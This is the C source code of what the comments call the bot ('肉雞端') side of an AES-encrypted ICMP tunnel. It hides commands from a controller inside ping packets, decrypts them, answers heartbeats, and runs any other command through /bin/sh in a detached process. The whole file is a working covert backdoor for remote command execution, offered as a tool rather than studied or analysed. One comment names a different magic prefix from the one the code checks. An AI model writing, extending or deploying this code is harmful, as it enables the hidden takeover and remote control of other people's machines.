#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <time.h>

#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>

#define MAGIC_PREFIX "ZKcommand,"
#define AESKEY "<KEY>"
// -----------------------------------------------------------
// ICMP checksum
// -----------------------------------------------------------
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(unsigned char*)buf;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return (unsigned short)(~sum);
}

// -----------------------------------------------------------
// AES 解密
// -----------------------------------------------------------
int aes_decrypt(unsigned char *key, unsigned char *iv,
                unsigned char *ciphertext, int cipher_len,
                unsigned char *plaintext)
{
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int len = 0, p_len = 0;

    EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key, iv);
    EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, cipher_len);
    p_len = len;

    EVP_DecryptFinal_ex(ctx, plaintext + len, &len);
    p_len += len;

    EVP_CIPHER_CTX_free(ctx);
    return p_len;
}

// -----------------------------------------------------------
// AES 加密
// -----------------------------------------------------------
int aes_encrypt(unsigned char *key, unsigned char *iv,
                unsigned char *plaintext, int p_len,
                unsigned char *ciphertext)
{
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int len = 0, c_len = 0;

    EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, p_len);
    c_len = len;

    EVP_EncryptFinal_ex(ctx, ciphertext + len, &len);
    c_len += len;

    EVP_CIPHER_CTX_free(ctx);
    return c_len;
}



// ============================================================================
//                              MAIN SERVER LOOP
// ============================================================================
int main() {

    // ★ AES key（與主控一致）
    size_t key_len = 0;

    unsigned char *key = OPENSSL_hexstr2buf(
    AESKEY,
    &key_len
);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        perror("socket");
        return 1;
    }

    printf("AES 加密 ICMP tunnel 肉雞端 已啟動\n");

    while (1) {

        char buf[3000];
        int len = recv(sockfd, buf, sizeof(buf), 0);
        if (len <= 0) {
            continue;
        }

        struct iphdr  *ip   = (struct iphdr*)buf;
        struct icmphdr *icmp = (struct icmphdr*)(buf + ip->ihl * 4);

        // 只接收指定 ID 的 Echo Request
        if (icmp->type == ICMP_ECHO && ntohs(icmp->un.echo.id) == 0x8888) {

            unsigned char *raw = (unsigned char*)(icmp + 1);

            // -----------------------------------------------------------
            // 找到 Base64 真正結束位置（\0 作為終止符）
            // -----------------------------------------------------------
            int payload_len = 0;
            while (raw[payload_len] != '\0' && payload_len < 2000) {
                payload_len++;
            }

            if (payload_len <= 0) {
                continue;
            }

            char b64buf[2100];
            memcpy(b64buf, raw, payload_len);
            b64buf[payload_len] = '\0';

            // -----------------------------------------------------------
            // Base64 decode
            // -----------------------------------------------------------
            unsigned char decoded[2100];
            int decoded_len = EVP_DecodeBlock(decoded,
                                              (unsigned char*)b64buf,
                                              payload_len);
            if (decoded_len <= 0) {
                continue;
            }

            // Base64 padding 修正
            int pad = 0;
            if (payload_len >= 1 && b64buf[payload_len - 1] == '=') pad++;
            if (payload_len >= 2 && b64buf[payload_len - 2] == '=') pad++;
            decoded_len -= pad;

            if (decoded_len < 17) { // 至少 16 bytes IV + 1 byte 密文
                continue;
            }

            // -----------------------------------------------------------
            // 拆出 IV + ciphertext
            // -----------------------------------------------------------
            unsigned char iv[16];
            memcpy(iv, decoded, 16);

            unsigned char *ciphertext = decoded + 16;
            int cipher_len = decoded_len - 16;
            if (cipher_len <= 0) {
                continue;
            }

            // -----------------------------------------------------------
            // AES 解密
            // -----------------------------------------------------------
            unsigned char plaintext[2000];
            int p_len = aes_decrypt(key, iv, ciphertext, cipher_len, plaintext);
            if (p_len <= 0) {
                continue;
            }
            plaintext[p_len] = '\0';

            // 清掉最後面的 \0 / \n / \r / space
            while (p_len > 0 &&
                  (plaintext[p_len - 1] == '\0' ||
                   plaintext[p_len - 1] == '\n'  ||
                   plaintext[p_len - 1] == '\r'  ||
                   plaintext[p_len - 1] == ' ')) {
                plaintext[p_len - 1] = '\0';
                p_len--;
            }

            // -----------------------------------------------------------
            // 重新整理成乾淨 ASCII 字串
            // -----------------------------------------------------------
            char clean[1024];
            int clean_len = 0;

            for (int i = 0; i < p_len; i++) {
                unsigned char c = plaintext[i];
                if (c >= 32 && c <= 126) { // 可見 ASCII
                    clean[clean_len++] = c;
                }
            }
            clean[clean_len] = '\0';

            // -----------------------------------------------------------
            // ★ MAGIC 驗證：不是 RJCMD| 開頭一律丟掉
            // -----------------------------------------------------------
            size_t magic_len = strlen(MAGIC_PREFIX);
            if (clean_len < (int)magic_len ||
                strncmp(clean, MAGIC_PREFIX, magic_len) != 0) {
                printf("[DROP] 非主控封包或解密錯誤: \"%s\"\n", clean);
                continue;   // 不回覆、不執行
            }

            // 真正指令在 MAGIC_PREFIX 之後
            char *real_cmd = clean + magic_len;

            // 再做一次 trim 前後空白
            while (*real_cmd == ' ') real_cmd++;
            int real_len = strlen(real_cmd);
            while (real_len > 0 &&
                  (real_cmd[real_len - 1] == ' ' ||
                   real_cmd[real_len - 1] == '\n' ||
                   real_cmd[real_len - 1] == '\r')) {
                real_cmd[real_len - 1] = '\0';
                real_len--;
            }

            if (real_len == 0) {
                printf("[DROP] 空指令\n");
                continue;
            }

            printf("收到主控(指令): %s\n", real_cmd);

            // ============================================================================
            // checkAlive：只回覆 Alive,<timestamp>，不執行 system()
            // ============================================================================
            if (strcmp(real_cmd, "checkAlive") == 0) {

                char reply_text[2000];
                snprintf(reply_text, sizeof(reply_text),
                         "RJalive,%ld", time(NULL));

                unsigned char reply_iv[16];
                RAND_bytes(reply_iv, 16);

                unsigned char reply_ct[2100];
                int reply_ct_len = aes_encrypt(key, reply_iv,
                                               (unsigned char*)reply_text,
                                               strlen(reply_text),
                                               reply_ct);

                unsigned char reply_raw[2200];
                memcpy(reply_raw, reply_iv, 16);
                memcpy(reply_raw + 16, reply_ct, reply_ct_len);

                unsigned char reply_b64[3000];
                int b64_len = EVP_EncodeBlock(reply_b64,
                                              reply_raw,
                                              reply_ct_len + 16);

                char reply_pkt[3000];
                memset(reply_pkt, 0, sizeof(reply_pkt));

                struct icmphdr *r = (struct icmphdr*)reply_pkt;
                r->type = ICMP_ECHOREPLY;
                r->code = 0;
                r->un.echo.id = icmp->un.echo.id;
                r->un.echo.sequence = icmp->un.echo.sequence;

                memcpy((char*)(r + 1), reply_b64, b64_len);

                int reply_len = sizeof(struct icmphdr) + b64_len;
                r->checksum = checksum((unsigned short*)reply_pkt, reply_len);

                struct sockaddr_in cli;
                cli.sin_family = AF_INET;
                cli.sin_addr.s_addr = ip->saddr;

                sendto(sockfd, reply_pkt, reply_len, 0,
                       (struct sockaddr*)&cli, sizeof(cli));

                printf("已echo RJalive\n");
                continue;   // 不執行 system()
            }


            // ============================================================================
            // 一般指令：先回覆 RJcopy,<cmd>，再執行 system(cmd)
            // ============================================================================
            char reply_text[2100];
            snprintf(reply_text, sizeof(reply_text),
                     "RJcopy,%s%s", MAGIC_PREFIX, real_cmd);

            unsigned char reply_iv[16];
            RAND_bytes(reply_iv, 16);

            unsigned char reply_ct[2100];
            int reply_ct_len = aes_encrypt(key, reply_iv,
                                           (unsigned char*)reply_text,
                                           strlen(reply_text),
                                           reply_ct);

            unsigned char reply_raw[2200];
            memcpy(reply_raw, reply_iv, 16);
            memcpy(reply_raw + 16, reply_ct, reply_ct_len);

            unsigned char reply_b64[3000];
            int b64_len = EVP_EncodeBlock(reply_b64,
                                          reply_raw,
                                          reply_ct_len + 16);

            char reply_pkt[3000];
            memset(reply_pkt, 0, sizeof(reply_pkt));

            struct icmphdr *r = (struct icmphdr*)reply_pkt;
            r->type = ICMP_ECHOREPLY;
            r->code = 0;
            r->un.echo.id = icmp->un.echo.id;
            r->un.echo.sequence = icmp->un.echo.sequence;

            memcpy((char*)(r + 1), reply_b64, b64_len);

            int reply_len = sizeof(struct icmphdr) + b64_len;
            r->checksum = checksum((unsigned short*)reply_pkt, reply_len);

            struct sockaddr_in cli;
            cli.sin_family = AF_INET;
            cli.sin_addr.s_addr = ip->saddr;

            // 先把 COPY 回給主控
            sendto(sockfd, reply_pkt, reply_len, 0,
                   (struct sockaddr*)&cli, sizeof(cli));

            printf("已echo RJcopy,ZKcommand,%s\n", real_cmd);

            // 再執行真正指令
            printf("執行指令: %s\n", real_cmd);
pid_t pid = fork();
if (pid == 0) {
    setsid();  
    execl("/bin/sh", "sh", "-c", real_cmd, (char*)NULL);
    _exit(127);
}
        }
    }

    close(sockfd);
    return 0;
}
